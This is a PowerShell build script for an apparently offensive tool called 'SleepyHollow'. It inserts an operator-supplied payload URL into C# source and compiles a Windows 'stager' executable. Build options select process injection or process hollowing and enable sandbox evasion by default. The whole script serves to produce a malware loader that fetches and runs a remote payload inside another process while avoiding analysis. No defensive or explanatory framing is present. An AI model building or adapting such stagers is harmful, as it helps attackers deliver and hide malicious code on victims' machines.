param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadUrl,
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = ".\SleepyHollow.exe",
    [Parameter(Mandatory=$false, HelpMessage="Technique to use for stager")]
    [ValidateSet("Inject", "Hollow")]
    [string]$Technique = "Hollow",
    [Parameter(Mandatory=$false, HelpMessage="Disable sandbox evasion")]
    [switch]$DisableSandboxEvasion,
    [Parameter(Mandatory=$false)]
    [ValidateSet("win-x64")]
    [string]$Runtime = "win-x64"
)

$oldContent = [System.IO.File]::ReadAllText(".\Program.cs")

function Replace-PayloadUrl{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )

    $filePath = ".\Program.cs"
    $content = Get-Content $filePath
    $newContent = $content -replace "<%URL%>", $PayloadUrl
    Set-Content $filePath $newContent
}

function Restore-Content{
    param(
        [Parameter(Mandatory=$true)]
        [string]$oldContent
    )

    $filePath = ".\Program.cs"
    Set-Content $filePath $oldContent -Force
}

function Output-Stager{
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputPath = ".\SleepyHollow.exe"
    )
    
    if(Test-Path $OutputPath){
        $title    = "File " + $OutputPath + " already exists"
        $question = 'Are you sure you want to proceed?'
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Move-Item ".\bin\Release\net7.0\$Runtime\publish\SleepyHollow.exe" $OutputPath -Force
        } else {
            exit
        }
    } else {
        Move-Item ".\bin\Release\net7.0\$Runtime\publish\SleepyHollow.exe" $OutputPath
    }
}

function Build-Stager{
    $projectPath = ".\SleepyHollow.csproj"
    $CONSTANTS = "HEADLESS"
    if($Technique -eq "Inject"){
        $CONSTANTS = $CONSTANTS + "%3BINJECT"
    }
    else{
        $CONSTANTS = $CONSTANTS + "%3BHOLLOW"
    }
    if($DisableSandboxEvasion){
        $CONSTANTS = $CONSTANTS + "%3BNO_SANDBOX"
    }
    dotnet publish -c Release /p:DefineConstants="$CONSTANTS" --self-contained -r $Runtime $projectPath > $null
}

Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
Replace-PayloadUrl $PayloadUrl
Write-Progress -Activity "[SleepyHollow] Building stager..." -Status "40% Complete:" -PercentComplete 40
Build-Stager 
Restore-Content $oldContent
Output-Stager $OutputPath
Write-Progress -Activity "[SleepyHollow] Finishing up..." -Status "100% Complete:" -PercentComplete 100
